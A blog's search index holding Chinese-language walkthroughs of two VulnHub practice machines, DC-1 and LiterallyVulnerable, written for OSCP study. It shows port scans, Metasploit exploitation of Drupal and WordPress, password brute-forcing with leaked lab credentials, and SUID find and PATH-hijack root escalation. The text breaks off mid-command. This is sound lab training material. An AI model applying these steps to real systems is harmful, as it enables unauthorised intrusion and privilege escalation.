<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DC-1</title>
      <link href="/2020/03/20/DC-1/"/>
      <url>/2020/03/20/DC-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>2020-03-17</p></blockquote><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">80/tcp open http Apache httpd 2.2.22 ((Debian))</span><br><span class="line">111/tcp open rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">################## ALL Port ###########################3</span></span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">| 2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA) </span><br><span class="line">|_ 256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp open http Apache httpd 2.2.22 ((Debian)) |_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">|/themes//CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">|/INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp open rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo:</span><br><span class="line">| program version port/proto service</span><br><span class="line">...</span><br><span class="line">35460/tcp open status 1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure><h3 id="web-目录枚举"><a href="#web-目录枚举" class="headerlink" title="web 目录枚举"></a>web 目录枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">############# &#x2F;robots.txt ################ #</span><br><span class="line"># robots.txt</span><br><span class="line">#</span><br><span class="line"># This file is to prevent the crawling and indexing of certain parts</span><br><span class="line"># of your site by web crawlers and spiders run by sites like Yahoo!</span><br><span class="line"># and Google. By telling these &quot;robots&quot; where not to go on your site,</span><br><span class="line"># you save bandwidth and server resources.</span><br><span class="line">#</span><br><span class="line"># This file will be ignored unless it is at the root of your host:</span><br><span class="line"># Used:</span><br><span class="line"># Ignored: #</span><br><span class="line"># For more</span><br><span class="line"># http:&#x2F;&#x2F;www.robotstxt.org&#x2F;wc&#x2F;robots.html #</span><br><span class="line"># For syntax checking, see:</span><br><span class="line"># http:&#x2F;&#x2F;www.sxw.org.uk&#x2F;computing&#x2F;robots&#x2F;check.html</span><br><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># Directories</span><br><span class="line">Disallow: &#x2F;includes&#x2F; </span><br><span class="line">Disallow: &#x2F;misc&#x2F;</span><br><span class="line">Disallow: &#x2F;modules&#x2F;</span><br><span class="line">Disallow: &#x2F;profiles&#x2F; </span><br><span class="line">Disallow: &#x2F;scripts&#x2F;</span><br><span class="line">Disallow: &#x2F;themes&#x2F;</span><br><span class="line"># Files</span><br><span class="line">Disallow: &#x2F;CHANGELOG.txt </span><br><span class="line">Disallow: &#x2F;cron.php</span><br><span class="line">Disallow: &#x2F;INSTALL.mysql.txt </span><br><span class="line">Disallow: &#x2F;INSTALL.pgsql.txt </span><br><span class="line">Disallow: &#x2F;INSTALL.sqlite.txt </span><br><span class="line">Disallow: &#x2F;install.php </span><br><span class="line">Disallow: &#x2F;INSTALL.txt </span><br><span class="line">Disallow: &#x2F;LICENSE.txt </span><br><span class="line">Disallow: &#x2F;MAINTAINERS.txt</span><br><span class="line">Disallow: &#x2F;update.php </span><br><span class="line">Disallow: &#x2F;UPGRADE.txt </span><br><span class="line">Disallow: &#x2F;xmlrpc.php</span><br><span class="line"># Paths (clean URLs) </span><br><span class="line">Disallow: &#x2F;admin&#x2F; </span><br><span class="line">Disallow: &#x2F;comment&#x2F;reply&#x2F; </span><br><span class="line">Disallow: &#x2F;filter&#x2F;tips&#x2F; </span><br><span class="line">Disallow: &#x2F;node&#x2F;add&#x2F; </span><br><span class="line">Disallow: &#x2F;search&#x2F; </span><br><span class="line">Disallow: &#x2F;user&#x2F;register&#x2F; </span><br><span class="line">Disallow: &#x2F;user&#x2F;password&#x2F; </span><br><span class="line">Disallow: &#x2F;user&#x2F;login&#x2F; </span><br><span class="line">Disallow: &#x2F;user&#x2F;logout&#x2F;</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: &#x2F;?q&#x3D;admin&#x2F; </span><br><span class="line">Disallow: &#x2F;?q&#x3D;comment&#x2F;reply&#x2F; </span><br><span class="line">Disallow: &#x2F;?q&#x3D;filter&#x2F;tips&#x2F; </span><br><span class="line">Disallow: &#x2F;?q&#x3D;node&#x2F;add&#x2F; </span><br><span class="line">Disallow: &#x2F;?q&#x3D;search&#x2F; </span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;password&#x2F; </span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;register&#x2F; </span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;login&#x2F; </span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;logout&#x2F;</span><br></pre></td></tr></table></figure><p><img src="2020-03-17-11-17-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-17-23屏幕截图"> </p><p>逐一访问，得到如下信息：</p><ul><li>CMS：Drupal</li><li>版本：7.X</li></ul><p><img src="2020-03-17-11-48-03%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-48-03屏幕截图"> </p><h2 id="漏洞利用-Getshell"><a href="#漏洞利用-Getshell" class="headerlink" title="漏洞利用(Getshell)"></a>漏洞利用(Getshell)</h2><p>搜索历史漏洞，找一个可正常利用的，有的会因为各种问题无法使用</p><p>在 MSF 上搜到几个，挑个利用：</p><p><code>use exploit/unix/webapp/drupal_drupalgeddon2</code> </p><p><img src="2020-03-17-11-48-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-48-51屏幕截图"> </p><p><img src="2020-03-17-12-12-26%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-12-26屏幕截图"> </p><p><img src="2020-03-17-12-18-40%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-18-40屏幕截图"></p><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li>登陆用户：www-data</li><li><code>Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux</code> </li><li><code>/etc/passwd</code> <ul><li><code>flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</code> </li></ul></li></ul><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>查看当前目录，得到一个 flag， <code>flag4</code>用户下得到第二个 flag</p><p><img src="2020-03-17-12-29-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-29-33屏幕截图"></p><p>flag1 提示找 Drupal 的配置文件，百度一下 Drupal 的配置文件一般位于 <code>/var/www/sites/default/</code> </p><p>文件名是 <code>settings.php</code> </p><p> <code>find</code> 一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name settings.php 2&gt;/dev/null </span><br><span class="line">/var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure><p>查看后得到 flag2 和一组用户名密码，登陆数据库得到两个用户名(第三个是我自己加的)，密码被加密，暂时没有作用</p><p><img src="%E6%88%AA%E5%B1%8F2020-03-1712.36.32.png" alt="截屏2020-03-1712.36.32"> </p><p><img src="2020-03-17-12-45-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-45-25屏幕截图"> </p><p><img src="2020-03-17-13-16-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-13-16-07屏幕截图"> </p><p><img src="%E6%88%AA%E5%B1%8F2020-03-1916.11.12.png" alt="截屏2020-03-1916.11.12"> </p><h3 id="密码枚举"><a href="#密码枚举" class="headerlink" title="密码枚举"></a>密码枚举</h3><p>flag2 提到了密码爆破不是唯一的方法，可能是通过修改数据库内某个用户的密码，不想这么麻烦</p><p>听歌的时候想到了还有个 flag4 用户，既然存在，那肯定有其道理，试试能不能枚举<br><code>hydra</code> 爆破 ssh，因为刚装的系统，密码字典还没下载，就先用 <code>john</code> 的，还真得到了密码</p><p><img src="2020-03-17-14-25-48%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-14-25-48屏幕截图"> </p><h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>登录 ssh，查看 SUID ，<code>find</code> 提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/find<span class="comment"># &lt;---</span></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/pt_chown </span><br><span class="line">/usr/lib/openssh/ssh-keysign </span><br><span class="line">/usr/lib/eject/dmcrypt-get-device </span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper </span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="%E6%88%AA%E5%B1%8F2020-03-1715.10.08.png" alt="截屏2020-03-1715.10.08"> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ find ./ -<span class="built_in">type</span> f -name flag4.txt -<span class="built_in">exec</span> <span class="string">"whoami"</span> \; </span><br><span class="line">root</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ find ./ -<span class="built_in">type</span> f -name flag4.txt -<span class="built_in">exec</span> <span class="string">"/bin/sh"</span> \;</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># cat thefinalflag.txt</span></span><br></pre></td></tr></table></figure><p>都提权了，其他 flag 也就无所谓了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br><span class="line">flag2</span><br><span class="line">flag4</span><br><span class="line">thefinalflag.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LiterallyVulnerable</title>
      <link href="/2020/03/20/LiterallyVulnerable/"/>
      <url>/2020/03/20/LiterallyVulnerable/</url>
      
        <content type="html"><![CDATA[<blockquote><p>2020-03-08 14:26 — 2020-03-09</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Flags: 3 (local.txt, user.txt &amp; root.txt)</span><br><span class="line">Difficulty Level: Initial Shell (Easy) - Privileges Escalation (Intermediate)</span><br><span class="line">Website: https:&#x2F;&#x2F;ebryx.com</span><br><span class="line">Hint: Maybe, you hasted and left some open holes unchecked?</span><br><span class="line">Literally Vulnerable is supposed to give beginners a taste of real-world scenarios and OSCP machines at the same time! It was inspired highly by the @DC series.</span><br><span class="line"></span><br><span class="line">You&#39;re supposed to know the big three (EEEs) Enumeration, Exploitation &amp; Escalation of pentesting to pwn the machine. The machine is supposed to be beginner-friendly and the difficulty level is Easy-Intermediate depending on your knowledge. You need to have enough information about Linux file types &amp; permissions for privileges escalation.</span><br><span class="line"></span><br><span class="line">Technical Information:</span><br><span class="line">Just download, extract and load the .vmx file in VMware Workstation (tested on VMware Workstation 15.x.x)</span><br><span class="line">The adapter is currently NAT, networking is configured for DHCP and IP will get assigned automatically</span><br><span class="line">Contact:</span><br><span class="line">You can either contact me on twitter @syed__umar or linkedin (&#x2F;in&#x2F;syedumararfeen&#x2F;) for hints!</span><br><span class="line">There are three flags in the machine: local.txt, user.txt &amp; root.txt. You&#39;re supposed to grab all three in order to completely pwn the machine. Hope you like the machine, best of luck! :)</span><br><span class="line"></span><br><span class="line">I&#39;ll try my best to continue with the series!</span><br><span class="line">--------</span><br><span class="line">From : https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;ua-literally-vulnerable,407&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali：172.16.252.129</span><br><span class="line">目标：172.16.252.1/24</span><br></pre></td></tr></table></figure><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -sn -T5 -v 172.16.252.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure><p>目标端口服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -Pn -sV -O 172.16.252.131</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br></pre></td></tr></table></figure><p>全部端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">21/tcp open ftp vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r-- 1 ftp ftp 325 Dec 04 13:05 backupPasswords </span><br><span class="line">| ftp-syst:</span><br><span class="line">| STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">| Connected to ::ffff:172.16.252.129</span><br><span class="line">| Logged <span class="keyword">in</span> as ftp</span><br><span class="line">| TYPE: ASCII</span><br><span class="line">| No session bandwidth <span class="built_in">limit</span></span><br><span class="line">| Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">| Control connection is plain text</span><br><span class="line">| Data connections will be plain text</span><br><span class="line">| At session startup, client count was 1</span><br><span class="line">| vsFTPd 3.0.3 - secure, fast, stable </span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)</span><br><span class="line">| 256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA) </span><br><span class="line">|_ 256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)</span><br><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Not so Vulnerable &amp;<span class="comment">#8211; Just another WordPress site </span></span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br></pre></td></tr></table></figure><p>开启的端口：21、22、80、65535</p><h3 id="FTP-匿名登陆"><a href="#FTP-匿名登陆" class="headerlink" title="FTP 匿名登陆"></a>FTP 匿名登陆</h3><p>FTP 可以匿名访问，得到几个密码，暂不知用途：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*<span class="variable">$eGRIf7v38s</span>&amp;p7 </span><br><span class="line">yP$*SV09YOrx7mY </span><br><span class="line">GmceC&amp;oOBtbnFCH </span><br><span class="line">3!IZguT2piU8X<span class="variable">$c</span> </span><br><span class="line">P&amp;s%F1D4<span class="comment">#KDBSeS</span></span><br><span class="line"><span class="variable">$EPid</span>%J2L9LufO5 </span><br><span class="line">nD!mb*aHON&amp;76&amp;G </span><br><span class="line">$*Ke7q2ko3tqoZo </span><br><span class="line">SCb<span class="variable">$I</span>^gDDqE34fA </span><br><span class="line">Ae%tM0XIWUMsCLp</span><br></pre></td></tr></table></figure><p><img src="2020-03-08-14-48-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-48-33屏幕截图"></p><p> <img src="2020-03-08-14-49-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-49-20屏幕截图">  </p><h3 id="Web-目录枚举"><a href="#Web-目录枚举" class="headerlink" title="Web 目录枚举"></a>Web 目录枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">80&#x2F;tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx&#x2F;1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Not so Vulnerable &amp;#8211; Just another WordPress site </span><br><span class="line">|_http-trane-info: Problem with XML parsing of &#x2F;evox&#x2F;about</span><br><span class="line">65535&#x2F;tcp open http </span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br></pre></td></tr></table></figure><p>80 端口： nginx + Wordpress</p><p>65535端口：Apache</p><p>控制台显示资源请求错误多，可以看到它是从 <code>literally.vulnerable</code> 请求资源，可以设置 DNS：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"172.16.252.131    literally.vulnerable"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="2020-03-08-14-54-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-54-43屏幕截图"></p><p>先扫描 65535 端口，逐一访问，得到 <code>phpcms</code> 页面，访问需要密码，<code>wpsacn</code> 枚举</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.py -u <span class="string">"http://172.16.252.131:65535"</span> -e php --random-agents -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure><p><img src="2020-03-08-15-13-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-15-13-12屏幕截图"> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ --enumerate</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] maybeadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] notadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>得到两个用户名，使用前面得到的几个密码枚举爆破，碰运气，得到一组用户名密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ -U users.txt -P backupPasswords</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[i] Valid Combinations Found:</span><br><span class="line">| Username: maybeadmin, Password:<span class="variable">$EPid</span>%J2L9LufO5</span><br></pre></td></tr></table></figure><p><img src="2020-03-08-16-25-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-25-38屏幕截图"></p><h3 id="登录-Wordpress-后台"><a href="#登录-Wordpress-后台" class="headerlink" title="登录 Wordpress 后台"></a>登录 Wordpress 后台</h3><p>都翻了一遍，得到一组用户名和密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notadmin:Pa$$w0rd13!&amp;</span><br></pre></td></tr></table></figure><p><img src="2020-03-08-16-41-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-41-43屏幕截图"> </p><h2 id="登录系统-Getshell"><a href="#登录系统-Getshell" class="headerlink" title="登录系统(Getshell)"></a>登录系统(Getshell)</h2><p>利用 <code>MSF</code> 上传木马 getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/webapp/wp_admin_shell_upload</span><br></pre></td></tr></table></figure><p><img src="2020-03-09-18-18-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-18-18-23屏幕截图"></p><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer : literallyvulnerable</span><br><span class="line">OS : Linux literallyvulnerable 4.15.0-88-generic <span class="comment">#88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64</span></span><br><span class="line">Meterpreter : php/linux</span><br><span class="line">meterpreter &gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">######## lsb_release #############</span></span><br><span class="line">www-data@literallyvulnerable:$ lsb_release -a lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description: Ubuntu 18.04.3 LTS</span><br><span class="line">Release: 18.04</span><br><span class="line">Codename: bionic</span><br><span class="line"></span><br><span class="line"><span class="comment">####### /etc/passwd #######</span></span><br><span class="line">doe:x:1001:1001:Doe,,,:/home/doe:/bin/bash </span><br><span class="line">john:x:1000:1000:,,,:/home/john:/bin/bash</span><br></pre></td></tr></table></figure><p>寻找 SUID 程序，得到可疑文件：<code>itseasy</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="2020-03-09-19-27-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-27-43屏幕截图"> </p><h2 id="权限提升-User"><a href="#权限提升-User" class="headerlink" title="权限提升(User)"></a>权限提升(User)</h2><p>运行 <code>itseasy</code> 得到当前目录绝对路径，看过一篇通过操控 <code>PATH</code> 参数值进行提权；怀疑程序调用了 <code>pwd</code> 命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">cp /bin/bash /tmp/<span class="built_in">pwd</span>    <span class="comment"># or echo "/bin/bash" &gt; /tmp/pwd</span></span><br><span class="line">chmod 777 /tmp/<span class="built_in">pwd</span></span><br><span 